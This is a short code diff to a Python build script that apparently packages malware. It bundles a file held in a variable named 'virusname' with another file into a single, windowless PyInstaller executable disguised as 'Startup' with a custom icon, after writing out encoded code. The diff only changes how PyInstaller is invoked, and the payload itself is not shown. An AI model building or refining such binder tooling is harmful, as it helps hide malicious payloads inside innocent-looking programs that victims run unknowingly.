@@ -1,4 +1,4 @@
-from PyInstaller.building.build_main import run
+import PyInstaller.__main__
 from encoder import encode
 
 
@@ -45,6 +45,15 @@ else:
 with open("code.py","w") as f:
     f.write(code)
     f.close()
-opts = ['--onefile',"--noconsole",'--name=startup',"--icon=ico.ico",f'--add-data="{file};."',f'--add-data="{virusname};."', 'code.py']
-run(opts)
+
+
+PyInstaller.__main__.run([
+    '--onefile',   
+    '--noconsole',     
+    '--name=Startup',  
+    f'--add-data={virusname};.', 
+    f'--add-data={file};.', 
+    '--icon="ico.ico"',
+    'code.py'
+])
 print("[*]Hazır....")
